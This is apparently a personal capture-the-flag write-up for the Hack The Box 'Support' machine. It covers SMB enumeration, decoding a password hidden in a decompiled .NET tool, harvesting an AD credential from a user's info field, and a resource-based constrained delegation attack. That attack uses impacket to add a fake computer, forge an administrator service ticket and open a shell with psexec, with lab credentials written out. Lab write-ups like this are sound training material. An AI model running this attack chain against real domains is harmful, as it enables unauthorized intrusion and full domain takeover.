# Enumeration

## Nmap

<img src="Support-media/9cd78971f91ebb0a3be71c272d8980e4f0e0d176.png"
class="wikilink" alt="Pastedimage20250318091145.png" />
windows box, has open 445 indicating smb

list smb shares using smbclient
`smbclient --list=support.htb --no-pass`
<img src="Support-media/05b56fb6833286400e410f25b2b547a7827aef96.png"
class="wikilink" alt="Pastedimage20250318092127.png" />

we've got 6 shares, support-tools looks interesting
trying netexec with 'anonymous' user
`nxc smb support.htb -u 'anonymous' -p '' --shares`

<img src="Support-media/15280a9f69bfd726f1ab5e64483eb7206a8e1517.png"
class="wikilink" alt="Pastedimage20250318093218.png" />
guest has read rights to support-tools (\$IPC is a default for Inter Proces Communication by using RPC (Remote Procedure Call))

## Foothold

looking at support-tools via smb client:
`smbclient //support.htb/support-tools -U anonymous -p ''`

<img src="Support-media/ce1c580e704b7da78342b268c197ffc3f66debd4.png"
class="wikilink" alt="Pastedimage20250318094914.png" />
UserInfo.exe.zip looks interesting, download using smbclient
<img src="Support-media/244d45d468eaed16904ef76f669e3d79e116b1b5.png"
class="wikilink" alt="Pastedimage20250318095038.png" />
Unzip locally gives a bunch of files and a config doc

<figure>
<img src="Support-media/7335916e20b9e11e7857743efcb62dcd051109a2.png"
class="wikilink" alt="Pastedimage20250318095235.png" />
<figcaption
aria-hidden="true">Pastedimage20250318095235.png</figcaption>
</figure>

The config doc is an xml, holding .Unsafe Token
<img src="Support-media/6b9277e683b3d401bed4415aeaca07898e32f558.png"
class="wikilink" alt="Pastedimage20250318095330.png" />
Furthermore, the UserInfo.exe looks interesting - decompile using ghidra and look for passwords..

## Reverse engineering

Its a .NET executable Ghidra does not work
this page has an intro to .NET decompiling
https://medium.com/@tr15t4n/intro-to-net-reverse-engineering-c54823b22d6f

Installed ILspy (see
https://github.com/icsharpcode/ILSpy
https://github.com/icsharpcode/AvaloniaILSpy/releases/tag/v7.2-rc
and
https://youtu.be/FLyrOl0Uy0E?si=3NVWxkagPKbx52a2

Poking around in the UserInfo function:
<img src="Support-media/114faf623eb8652102639086d2cb56264ca671f7.png"
class="wikilink" alt="Pastedimage20250318120750.png" />
Reveals that the function hits an LDAP endpoint as user ldap
<img src="Support-media/ec91434cb4540ee7abd37448a76eee48241c77f6.png"
class="wikilink" alt="Pastedimage20250318123223.png" />
it also reveals an encoded password:
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
and a sneaky function to encode it

``` c#
internal class Protected
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(enc_password);
        byte[] array2 = array;
        for (int i = 0; i < array.Length; i++)
        {
            array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
        }
        return Encoding.Default.GetString(array2);
    }
}
```

Threw it at chatGPT and got

##### You said:

it uses this function to encode it, what is the output given the input from above? internal class Protected { private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"; private static byte\[\] key = Encoding.ASCII.GetBytes("armando"); public static string getPassword() { byte\[\] array = Convert.FromBase64String(enc_password); byte\[\] array2 = array; for (int i = 0; i \< array.Length; i++) { array2\[i\] = (byte)((uint)(array\[i\] \^ key\[i % key.Length\]) \^ 0xDFu); } return Encoding.Default.GetString(array2); } }

###### ChatGPT said:

The `getPassword` function decodes the Base64-encoded string, then performs a bitwise XOR operation on each byte with a cyclic key (`"armando"`) and an additional XOR with `0xDF`. Let's compute the output.

The output of `getPassword()` given the provided input is:

**`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`**

We now have a password for the ldap user
Throwing it into netexec:
<img src="Support-media/a3483d67fd26dbb26a9e251494b3c5c8e7edae39.png"
class="wikilink" alt="Pastedimage20250318124035.png" />
reveals a bunch of users

## Privilege Escalation

unleashing bloodhound
`bloodhound-python -d support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'  -ns 10.10.11.174`

### Note, mis-configuration: the info field in AD is used to contain a passwork!

ldapsearch for support@support.htb, looking at the info property
`ldapsearch -H ldap://10.10.11.174 -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*" | grep info`

gives a credential for the 'support user' : Ironside47pleasure40Watchful
<img src="Support-media/14f1e35790a808cbc80a505bb6064df6346896ce.png"
class="wikilink" alt="Pastedimage20250318153355.png" />

Throwing that into netexec
`nxc ldap support.htb -u 'support' -p 'Ironside47pleasure40Watchful'`
<img src="Support-media/563d5895f817afdffe969202a7bc9c920c261b03.png"
class="wikilink" alt="Pastedimage20250318205742.png" />
Yep! it works
\### Poking around
using evil-winrm
`evil-winrm -i support.htb  -u 'support' -p 'Ironside47pleasure40Watchful'`
<img src="Support-media/20619e49b17293ff3355c41ad8c4ff1cdc15171a.png"
class="wikilink" alt="Pastedimage20250318210456.png" />
user flag on supports desktiop
\## Privilege Escalalation

bloodhound
`bloodhound-python -d support.htb -u support -p Ironside47pleasure40Watchful -ns 10.10.11.174 -c All`

<img src="Support-media/73e8416c5ae144fd165dd30c5f6af035465c7b19.png"
class="wikilink" alt="Pastedimage20250318223202.png" />
Giving genericAll on DC.SUPPORT.HTB
<img src="Support-media/d9d2f134a321bb439b092ee55204db52e3fcecaa.png"
class="wikilink" alt="Pastedimage20250318223331.png" />

Generic-all allows us to create a user on the DC.SUPPORT.HTB controller box.
Bloodhound suggests a Resource-Based Constrained Delegation (RBCD) attack

### Step 1 add a fake computer

`impacket-addcomputer -dc-ip support.htb -computer-name badcomputer -computer-pass 'BadPass!' 'support.htb/support:Ironside47pleasure40Watchful'`
Added a badcomputer with password BadPass! (adhere to pw complexity)

Run bloodhound data acquisition again and it shows up..

<figure>
<img src="Support-media/bad1d36881d164f353c8667c590b471ce92e9c72.png"
class="wikilink" alt="Pastedimage20250503133840.png" />
<figcaption
aria-hidden="true">Pastedimage20250503133840.png</figcaption>
</figure>

And we can write to it from the Support user:

<figure>
<img src="Support-media/14d89120dca874888535cb5bc2a4f3653dd8bc14.png"
class="wikilink" alt="Pastedimage20250503134131.png" />
<figcaption
aria-hidden="true">Pastedimage20250503134131.png</figcaption>
</figure>

### Step 2: Delegate badcomputer to DC:

Make it possible for the badcomputer to delegate to the DC.SUPPORT computer, using impacket rbcd script

`impacket-rbcd -delegate-from 'BADCOMPUTER$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'`

<figure>
<img src="Support-media/1e0a32265bfa524e3b3862b1a964121c8fe421d8.png"
class="wikilink" alt="Pastedimage20250503140300.png" />
<figcaption
aria-hidden="true">Pastedimage20250503140300.png</figcaption>
</figure>

### Step 3: Cook up a service ticket

<figure>
<img src="Support-media/9d907742c10b1de53a4379dc88d21503a0417efd.png"
class="wikilink" alt="Pastedimage20250503140456.png" />
<figcaption
aria-hidden="true">Pastedimage20250503140456.png</figcaption>
</figure>

`impacket-getST  -spn 'cifs/DC.SUPPORT.HTB' -impersonate 'administrator' 'support.htb/badcomputer$:BadPass!'`

#### export the ccache

`export KRB5CCNAME=administrator@cifs_DC.SUPPORT.HTB@SUPPORT.HTB.ccache`
MITRE: steal Kerberos tickets stored in credential cache files (or ccache). These files are used for short term storage of a user's active session credentials. The ccache file is created upon user authentication and allows for access to multiple services without the user having to re-enter credentials.
https://attack.mitre.org/techniques/T1558/005/

### Setp 5 Pass the ticket

and pass the ticket using psexec:
`impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb -dc-ip 10.10.11.174`
<img src="Support-media/74ca7a71f82f22a910205201f9a0b41b20d35408.png"
class="wikilink" alt="Pastedimage20250503162601.png" />

Notes!
time must be synced with the box (Kerberos uses timestamp as sort of a nonce in the keys), sync using `ntpdate support.htb`
dc.support.htb must be added to /etc/hosts or else the psexec does not work

flag on the desktop
<img src="Support-media/b7502ce0cb2e60315e9fb0f7824dcb90205bd2e7.png"
class="wikilink" alt="Pastedimage20250503163335.png" />

# Refefrences

## Articles on Rubeus (alternative use here) and Kerberos hacking

https://www.hackingarticles.in/a-detailed-guide-on-rubeus/
Kerberos explainer
https://www.youtube.com/watch?v=5N242XcKAsM

## RBCD Attack

https://n1chr0x.medium.com/kerberos-takedown-unleashing-rubeus-and-impacket-for-active-directory-domination-58eeb7b6b6e3
